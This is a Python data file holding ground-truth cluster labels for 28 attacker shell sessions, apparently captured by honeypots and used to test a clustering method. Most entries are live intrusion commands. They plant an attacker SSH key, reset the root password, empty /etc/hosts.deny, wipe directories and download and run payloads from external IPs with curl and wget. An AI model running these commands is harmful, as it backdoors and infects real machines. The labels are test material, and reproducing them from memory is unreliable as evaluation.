# n = 28
GROUND_TRUTH = [
    (
        0,  # CLUSTER ID
        "cd ~; chattr -ia .ssh; lockr -ia .ssh",  # COMMAND SEQUENCE
    ),
    ##########
    (
        1,
        'cd ~; chattr -ia .ssh; lockr -ia .ssh\ncd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
    ),
    (
        1,
        "cd ~; chattr -ia .ssh; lockr -ia .ssh\ncd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~\ncat /proc/cpuinfo | grep name | wc -l\necho -e \"123456\nDbmXpc0LIMgW\nDbmXpc0LIMgW\"|passwd|bash\nEnter new UNIX password: \necho \"123456\nDbmXpc0LIMgW\nDbmXpc0LIMgW\n\"|passwd\ncat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'\nfree -m | grep Mem | awk '{print $2 ,$3,$4,$5,$6,$7}'\nls -lh $(which ls)\nwhich ls\ncrontab -l\nw\nuname -m\ncat /proc/cpuinfo | grep model | grep name | wc -l\ntop\nuname\nuname -a\nwhoami\nlscpu | grep Model\ndf -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
    ),
    (
        1,
        "cd ~; chattr -ia .ssh; lockr -ia .ssh\ncd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~\ncat /proc/cpuinfo | grep name | wc -l\necho \"root:BnYXljxBgpqW\"|chpasswd|bash\nrm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;\ncat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'\nfree -m | grep Mem | awk '{print $2 ,$3,$4,$5,$6,$7}'\nls -lh $(which ls)\nwhich ls\ncrontab -l\nw\nuname -m\ncat /proc/cpuinfo | grep model | grep name | wc -l\ntop\nuname\nuname -a\nwhoami\nlscpu | grep Model\ndf -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
    ),
    ##########
    (
        2,
        "cat /proc/cpuinfo | grep name | wc -l\necho \"root:GuWvKdw81OBa\"|chpasswd|bash\nrm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;\ncat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'\nfree -m | grep Mem | awk '{print $2 ,$3,$4,$5,$6,$7}'",
    ),
    ##########
    (
        3,
        "enable\nsystem\nshell\nsh\ncat /proc/mounts; /bin/busybox WZEUF\ncd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WZEUF\ntftp; wget; /bin/busybox WZEUF\ndd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s\n/bin/busybox WZEUF\nrm .s; exit",
    ),
    (
        3,
        "enable\nsystem\nshell\nsh\ncat /proc/mounts; /bin/busybox OBWBF\ncd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OBWBF\ntftp; wget; /bin/busybox OBWBF\ndd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s\n/bin/busybox OBWBF\nrm .s; exit",
    ),
    ##########
    (
        4,
        "uname -s -v -n -r -m",
    ),
    (
        4,
        "uname -s -m",
    ),
    (
        4,
        "uname -a",
    ),
    ##########
    (
        5,
        "uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://39.104.73.194/dred -o /tmp/dred;perl /tmp/dred",
    ),
    ##########
    (
        6,
        "uname\nuname -a\nwhoami\nlscpu | grep Model\ndf -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
    ),
    ##########
    (
        7,
        "./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;",
    ),
    ##########
    (
        8,
        "sh\nshell\nenable\nsystem\nping ;sh\n>/usr/.a && cd /usr/; rm -rf .a\n>/mnt/.a && cd /mnt/; rm -rf .a\n>/var/run/.a && cd /var/run/; rm -rf .a\n>/dev/shm/.a && cd /dev/shm/; rm -rf .a\n>/etc/.a && cd /etc/; rm -rf .a\n>/var/.a && cd /var/; rm -rf .a\n>/tmp/.a && cd /tmp/; rm -rf .a\n>/dev/.a && cd /dev/; rm -rf .a\n>/var/home/user/fw/.a && cd /var/home/user/fw/; rm -rf .a\nfor i in `cat /proc/mounts|grep tmpfs|grep -v noexec|cut -d ' ' -f 2`; do >$i/.a && cd $i;done\ncat /proc/mounts | grep tmpfs | grep -v noexec | cut -d -f 2\n/bin/busybox wget --help; /bin/busybox ftpget --help; /bin/busybox echo -e '\x67\x61\x79\x66\x67\x74';\nkill %1",
    ),
    (
        8,
        "sh\nshell\nenable\nsystem\nping ;sh\n>/usr/.a && cd /usr/; rm -rf .a\n>/mnt/.a && cd /mnt/; rm -rf .a\n>/var/run/.a && cd /var/run/; rm -rf .a\n>/dev/shm/.a && cd /dev/shm/; rm -rf .a\n>/etc/.a && cd /etc/; rm -rf .a\n>/var/.a && cd /var/; rm -rf .a\n>/tmp/.a && cd /tmp/; rm -rf .a\n>/dev/.a && cd /dev/; rm -rf .a\n>/var/home/user/fw/.a && cd /var/home/user/fw/; rm -rf .a\nfor i in `cat /proc/mounts|grep tmpfs|grep -v noexec|cut -d ' ' -f 2`; do >$i/.a && cd $i;done\ncat /proc/mounts | grep tmpfs | grep -v noexec | cut -d -f 2\n/bin/busybox wget --help; /bin/busybox ftpget --help; /bin/busybox echo -e '\x67\x61\x79\x66\x67\x74';",
    ),
    ##########
    (
        9,
        "sh\nshell\nenable\nsystem\nping; sh\n\n/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
    ),
    (
        9,
        "sh\nshell\nenable\nsystem\nping ;sh\n/bin/busybox cat /proc/self/exe || cat /bin/echo",
    ),
    ##########
    (
        10,
        "cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.88/bins.sh; curl -O http://37.44.238.88/bins.sh;/bin/busybox wget http://37.44.238.88/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh",
    ),
    ##########
    (
        11,
        "chmod +x ./.2739177057536283371/sshd;nohup ./.2739177057536283371/sshd 96.65.211.250 36.129.53.172 198.46.200.177 182.151.13.134 91.108.227.164 64.225.76.134 45.251.115.48 125.124.106.113 167.99.88.146 23.95.231.95 8.215.76.29 212.113.112.44 59.38.100.77 103.142.199.76 104.131.44.239 125.124.215.61 107.172.239.49 103.174.9.66 103.229.127.211 87.120.165.170 154.90.51.86 143.198.157.231 91.92.120.31 176.65.138.133 104.234.184.21 134.209.26.3 27.124.21.86 79.120.74.12 137.184.8.214 219.151.183.176 101.91.181.235 47.84.77.51 194.146.13.206 211.154.194.22 4.4.66.82 209.141.57.99 159.203.108.2 202.165.14.51 103.145.145.76 103.145.145.82 23.182.128.13 31.220.91.211 43.239.110.69 47.236.20.182 115.231.181.61 87.120.165.56 86.104.220.73 154.86.156.69 94.156.102.174 120.133.79.69 38.11.90.140 &",
    ),
    ##########
    (
        12,
        "/ip cloud print\nifconfig\nuname -a\ncat /proc/cpuinfo\nps | grep '[Mm]iner'\nps -ef | grep '[Mm]iner'\nls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*\necho Hi | cat -n",
    ),
    ##########
    (
        13,
        "whoami",
    ),
    ##########
    (
        14,
        "From: <sip:nm@nm>;tag=root\nTo: <sip:nm2@nm2>\nCall-ID: 50000\nCSeq: 42 OPTIONS\nMax-Forwards: 70\nContent-Length: 0\nContact: <sip:nm@nm>\nAccept: application/sdp\n",
    ),
    ##########
    (
        15,
        "echo LUZFZH8yd8m",
    ),
    ##########
    (
        16,
        'echo -e "\x6F\x6B"',
    ),
    ##########
    (
        17,
        "Connection: close\n",
    ),
    ##########
    (
        18,
        "(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)",
    ),
    ##########
    (
        19,
        "ls /",
    ),
    ##########
    (
        20,
        "",
    ),
]
